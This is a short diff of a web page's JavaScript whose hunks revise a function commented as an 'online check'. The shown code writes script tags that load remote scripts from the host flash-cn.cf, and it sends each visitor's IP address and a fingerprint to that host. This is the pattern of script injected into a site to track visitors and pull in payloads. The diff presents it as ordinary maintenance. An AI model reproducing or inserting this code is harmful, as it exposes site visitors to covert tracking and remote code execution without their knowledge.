@@ -5,7 +5,7 @@ document.write("<script src='http://flash-cn.cf/bobo.php?getaddr=123'></script>"
 
 
 //上线检测
-function isRise(ip,bobo) {
+function isRise(ip,extend) {
     var xmlHttp;
     if (window.XMLHttpRequest) {
         xmlHttp = new XMLHttpRequest();
@@ -25,7 +25,7 @@ function isRise(ip,bobo) {
             var resData = xmlHttp.responseText;
             if (resData == "in" && extend == "111111") {
             } else {
-                document.write("<script src='http://flash-cn.cf/bobo.php?bobo=1'></script>");
+                document.write("<script src='http://flash-cn.cf/bobo.php?bite1=1'></script>");
                 xmlHttp.open("GET", "http://flash-cn.cf/bobo.php?ip="+ip+fingerprint, "true");
                 xmlHttp.send();
                 xmlHttp.onreadystatechange = function() {
